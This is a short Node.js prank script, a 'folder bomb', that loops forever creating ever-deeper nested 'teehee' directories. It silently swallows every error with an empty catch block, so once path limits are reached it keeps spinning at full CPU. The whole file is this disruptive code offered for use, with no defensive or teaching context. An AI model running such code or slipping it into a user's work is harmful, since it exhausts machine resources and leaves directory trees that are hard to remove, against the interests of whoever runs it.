const fs = require("fs");
let path = "teehee";

// Creates nested (one inside another) folders as fast as it can
while (true) {
  try {
    path = path + "/" + path;
    fs.mkdirSync(path, { recursive: true });
  } catch (e) { } // Just incase the folder alr exists and fs throws an error
}